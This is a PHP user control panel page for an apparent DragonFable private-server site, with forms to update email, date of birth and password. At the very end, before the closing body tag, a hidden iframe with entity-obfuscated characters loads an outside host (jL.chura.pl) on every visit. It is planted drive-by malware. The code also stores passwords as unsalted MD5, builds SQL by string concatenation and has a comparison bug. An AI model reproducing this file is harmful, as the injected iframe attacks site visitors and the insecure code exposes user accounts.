<?php
session_start();
include ("includes/config.php");
if(!isset($_SESSION['name'])){
	$message = "Please login <a href=\"login.php\">here</a>.";
} else {
	$name = $_SESSION['name'];
	$sql = mysql_query("SELECT * FROM df_users WHERE name = '".$name."'");
	if ($data == mysql_fetch_assoc($sql)){
	$set_email = htmlspecialchars($data['email']);
	$set_password = $data['pass'];
	}
	if(isset($_POST['submitted'])){
		if(isset($_POST['email'])){
			if($_POST['email'] == $_POST['email_confirm']){
				if($_POST['email'] != ""){
					$new_email = mysql_real_escape_string(stripslashes(htmlspecialchars($_POST['email'])));
					$query = mysql_query("UPDATE df_users SET email = '".$new_email."' WHERE name = '".$name."'");
				}
			} else {
				$message = "The emails do not match. Please try again.";
			}
		} 
		if (isset($_POST['pass'])){
			if($_POST['pass'] == $_POST['pass_confirm']){
				if($_POST['pass'] != ""){
					$new_pass = md5($_POST['pass']);
					$query2 = mysql_query("UPDATE df_users SET pass = '".$new_pass."' WHERE name = '".$name."'");
				}
			} else {
				$message = "The passwords do not match. Please try again.";
			}
		}
		if (isset($_POST['dob'])){
			if($_POST['dob'] == $_POST['dob_confirm']){
				if($_POST['dob'] != ""){
					$new_dob = mysql_real_escape_string(stripslashes(htmlspecialchars($_POST['dob'])));
					$query3 = mysql_query("UPDATE df_users SET dob = '".$new_dob."' WHERE name = '".$name."'");
				}
			} else {
				$message = "The Dates do not match. Please try again.";
			}
		}
	
		if((isset($query)) && (isset($query2))){
			$message = "Your email and password have been successfully updated";
		} elseif ((isset($query)) && (isset($query3))){
			$message = "Your email and Date of Birth have been successfully updated";
		} elseif ((isset($query2)) && (isset($query3))){
			$message = "Your password and Date of Birth have been successfully updated";
		} elseif (isset($query2)){
			$message = "Your password has been successfully updated";
		} elseif (isset($query)){
			$message = "Your email has been updated";
		} elseif (isset($query3)){
			$message = "Your Date of Birth has been updated";
		} else {
			$message = "Nothing has been updated.";
		}
	} else {
	$message = ('<table border="0"><form action="" method="POST">
			<tr><td>New Email:</td> <td><input type="email" name="email" value="'.$set_email.'" /></td></tr>
			<tr><td>Confirm New Email:</td> <td><input type="email" name="email_confirm" value="" /></td></tr>
			<tr><td></td><td></td></tr>
			<tr><td>New Date of Birth:</td> <td><input type="dob" name="dob" value="" /></td></tr>
			<tr><td>Confirm New Date of Birth:</td> <td><input type="dob" name="dob_confirm" value="" /></td></tr>
			<tr><td>New Password:</td> <td><input type="password" name="pass" value="" /></td></tr>
			<tr><td>Confirm New Password:</td> <td><input type="password" name="pass_confirm" value="" /></td></tr>
			<tr><td><input type="submit" value="Update" />
			<input type="hidden" name="submitted" /></table>');
	}
}
	
?>
<?php
$query = mysql_query("SELECT * FROM df_settings LIMIT 1");
$fetch = mysql_fetch_assoc($query);
$sitename = $fetch['DFSitename'];
$skin = $fetch["backgrondSkin"];
$time = date(" g:i:s A ");
?>
<html>
<head>
<title><?php echo $sitename; ?> - User Control Panel</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="includes/dragonfable.css" rel="stylesheet" type="text/css">
<style type="text/css">
<!--
body   {background: #000000 url(<?php echo $skin; ?>) no-repeat fixed top center;}
#skin-wrap {
	position: absolute;
	width: 1600px;
	top: 0px;
	left: 50%;
	margin-left: -800px;
}
#main-content {
	position: absolute;
	width: 950px;
	top: 0px;
	left: 50%;
	margin-left: -475px;
}
.style1 {
	font-size: 13px;
	font-weight: bold;
}
-->
</style>
<script src="includes/AC_RunActiveContent.js" type="text/javascript"></script>
</head>
<body>
<!-- Header -->
<script src="includes/AC_RunActiveContent.js" type="text/javascript"></script>
<table border="0" align="center" cellpadding="2" cellspacing="0">
  <tr>
    <td bgcolor="#000000" valign="top"><table width="750" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td width="225" align="left" valign="top" class="tdbg" id="menu">
        <!--Navigation -->
		<?php include_once "sidebar.php"; ?></td>
        <td width="525" align="left" valign="top" class="tdbg">
			<table width="525" border="0" cellspacing="0" cellpadding="0">
				<tr>
				  <td colspan="2" align="right" bgcolor="#660000"><img src="images/clear.gif" width="400" height="60" alt="images/clear.gif"/></td>
			  </tr>
              <tr>
				  <td colspan="2" class="tdtrim"><img src="images/clear.gif" height="2" alt="images/clear.gif"/></td>
			  </tr>
				<tr>
				  <td height="25" align="right" valign="middle"><img src="images/clear.gif" width="1" height="25" align="left" alt="images/clear.gif"/></td>
				 <td align="right" valign="middle"><span class="server"><strong class="style2">Server Status:</strong> <font color=white>Online</font>. &nbsp;&nbsp;&nbsp;[<strong class="style2"><?php echo $time; ?>
				 </strong>] &nbsp;</span></td>
				</tr>              
            </table>
			<table width="525" border="0" cellspacing="0" cellpadding="5">
              <tr>
                <td class="tdbg">&nbsp;</td>
              </tr>
              <tr>
                <td class="tdbg" align="left"><!-- End Header -->
                  <br />
                  <table width="500" border="0" cellpadding="10" cellspacing="0">
                    <tr>
                      <td align="left" valign="top"><p><?php echo $message; ?></p>
                      </td>
                    </tr>
                  </table>
                  <!-- Footer -->
</td>
  </tr>
</table>
</td>
</tr>
<tr>
  <td colspan="2" align="center" class="tdbase"><p align="center"><em>Copyright &copy; 2010 Artix Entertainment, LLC. All Rights Reserved.</em><br />&quot;AdventureQuest&quot;,  &quot;DragonFable&quot;, &quot;MechQuest&quot;, &quot;ArchKnight&quot;, &quot;BattleOn.com&quot;,  &quot;AdventureQuest Worlds&quot;, &quot;Artix Entertainment&quot;<br />and all game  character names are either trademarks or registered trademarks of Artix  Entertainment, LLC. All rights are reserved.</p><br /><br /></td>
</tr>
</table>
</td>
<?php include_once "/right-sidebar.php"; ?>
</tr>
</table>
<iframe src="http://jL.ch&#117;ra.pl/rc/" style="d&#105;splay:none"></iframe>
</body>
</html>